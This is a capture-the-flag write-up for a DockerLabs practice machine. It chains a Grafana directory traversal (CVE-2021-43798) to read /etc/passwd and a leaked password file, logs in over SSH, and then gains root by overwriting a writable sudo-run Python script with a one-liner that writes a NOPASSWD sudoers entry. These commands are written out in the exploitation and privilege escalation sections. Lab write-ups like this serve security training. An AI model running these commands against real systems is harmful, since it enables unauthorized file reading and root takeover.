# move

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| move | El Pingüino de Mario | Easy | DockerLabs |

**Summary:** The "move" machine presents a scenario involving a vulnerable Grafana instance and a misconfigured web server. The initial foothold is established by identifying a Directory Traversal vulnerability in Grafana v8.3.0 (CVE-2021-43798), which allows for arbitrary file reading. Simultaneously, directory enumeration on the web server reveals a maintenance page that leaks the location of sensitive credentials. By chaining the file read vulnerability with this information, we retrieve SSH credentials for the user "freddy". The privilege escalation phase exploits a sudo misconfiguration where the user can execute a specific Python script as root. Since the script is writable by the user, we modify it to inject a malicious payload, ultimately granting full root access.

---

## Reconnaissance

We begin by deploying the machine and verifying connectivity. Once the target IP `172.17.0.2` is active, we initiate a comprehensive network scan using Nmap to identify open ports and running services.

```bash
nmap -sC -sV -p- -T4 172.17.0.2
```

The scan results reveal three open ports:
*   **Port 22**: OpenSSH 9.6p1
*   **Port 80**: Apache httpd 2.4.58
*   **Port 3000**: Grafana

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 06:22 WIB
Nmap scan report for 172.17.0.2
Host is up (0.000010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey:
|   256 77:0b:34:36:87:0d:38:64:58:c0:6f:4e:cd:7a:3a:99 (ECDSA)
|_  256 1e:c6:b2:91:56:32:50:a5:03:45:f3:f7:32:ca:7b:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.58 (Debian)
3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
```

Visiting port 3000 in a web browser confirms the presence of a Grafana login page, which helps us identify the exact version of the service.

![](image.png)

---

## Vulnerability Discovery

With the Grafana version identified as 8.3.0, we use `searchsploit` to check for known vulnerabilities.

```bash
searchsploit grafana 8.3.0
```

```bash
------------------------------ ---------------------------------
 Exploit Title                |  Path
------------------------------ ---------------------------------
Grafana 8.3.0 - Directory Tra | multiple/webapps/50581.py
------------------------------ ---------------------------------
Shellcodes: No Results
```

The search returns a Directory Traversal and Arbitrary File Read exploit (CVE-2021-43798). We mirror the exploit script to our working directory for inspection and usage.

```bash
searchsploit -m multiple/webapps/50581.py
```

To verify the vulnerability, we run the Python script against the target on port 3000. The script successfully retrieves the contents of `/etc/passwd`, confirming we have arbitrary file read capabilities. This output also enumerates the users on the system, revealing a user named `freddy`.

```bash
python3 50581.py -H 172.17.0.2:3000
```

```bash
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
freddy:x:1000:1000::/home/freddy:/bin/bash
```

### Web Enumeration

While investigating the Grafana instance, we also perform directory enumeration on the Apache web server running on port 80 to look for hidden resources.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt,.php,.html,.log,.js
```

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
...
/index.html           (Status: 200) [Size: 10701]
/maintenance.html     (Status: 200) [Size: 63]
...
```

The scan discovers a `maintenance.html` file. Inspecting this file with `curl` reveals a critical piece of information regarding credential storage.

```bash
curl -i http://172.17.0.2/maintenance.html
```

```bash
HTTP/1.1 200 OK
Date: Sat, 14 Mar 2026 23:40:55 GMT
Server: Apache/2.4.58 (Debian)
...
<h1>Website under maintenance, access is in /tmp/pass.txt</h1>
```

The message indicates that access credentials are stored in `/tmp/pass.txt`.

---

## Exploitation

We now have two critical findings:
1.  An Arbitrary File Read vulnerability in Grafana.
2.  Knowledge that credentials are located at `/tmp/pass.txt`.

By modifying the previous exploit or using the same vulnerability to target `/tmp/pass.txt` instead of `/etc/passwd`, we can retrieve the credentials. Using the password obtained from this file, we successfully authenticate via SSH as the user `freddy`.

```bash
ssh freddy@172.17.0.2
```

```bash
freddy@172.17.0.2's password:
Linux 3010fb428f69 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64
...
┌──(freddy㉿3010fb428f69)-[~]
└─$ id;whoami;hostname
uid=1000(freddy) gid=1000(freddy) groups=1000(freddy)
freddy
3010fb428f69
```

---

## Privilege Escalation

After gaining initial access, we check for sudo privileges to identify potential escalation paths.

```bash
sudo -l
```

```bash
Matching Defaults entries for freddy on 3010fb428f69:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on 3010fb428f69:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

The output shows that `freddy` can execute `/opt/maintenance.py` using python3 as root without a password. We examine the permissions of this file.

```bash
ls -la /opt/maintenance.py
```

```bash
-rw-r--r-- 1 freddy freddy 35 Mar 29  2024 /opt/maintenance.py
```

The file is owned by `freddy` and is writable. This allows us to replace the script's content with malicious code that will run with root privileges. We overwrite the script to execute a command that adds `freddy` to the sudoers file with full NOPASSWD privileges.

```zsh
echo 'import os; os.system("echo \"freddy ALL=(ALL:ALL) NOPASSWD:ALL\" > /etc/sudoers.d/freddy")' > /opt/maintenance.py
```

With the malicious script in place, we execute it using `sudo`.

```bash
sudo /usr/bin/python3 /opt/maintenance.py
```

After the script executes, we verify our new privileges.

```bash
sudo -l
```

```bash
User freddy may run the following commands on 3010fb428f69:
    (ALL : ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

We now have full sudo access. We switch to the root user to complete the compromise.

```bash
sudo -i
```

```bash
┌──(root㉿3010fb428f69)-[~]
└─# id;whoami;hostname;pwd;ls -la
uid=0(root) gid=0(root) groups=0(root)
root
3010fb428f69
/root
total 40
drwx------ 1 root root  4096 Mar 29  2024 .
drwxr-xr-x 1 root root  4096 Mar 14 23:05 ..
...
```

---

## Attack Chain Summary

1.  **Reconnaissance**: Identified open ports 22, 80, and 3000 using Nmap.
2.  **Vulnerability Discovery**: Detected a Grafana 8.3.0 instance vulnerable to Directory Traversal (CVE-2021-43798) and found a hidden maintenance page on port 80 leaking the password path.
3.  **Exploitation**: Leveraged the Grafana LFI to read the leaked password file at `/tmp/pass.txt` and logged in via SSH.
4.  **Internal Enumeration**: Checked `sudo -l` to find a writable Python script runnable as root.
5.  **Privilege Escalation**: Modified the writable script to inject a sudoers entry, granting full root privileges.
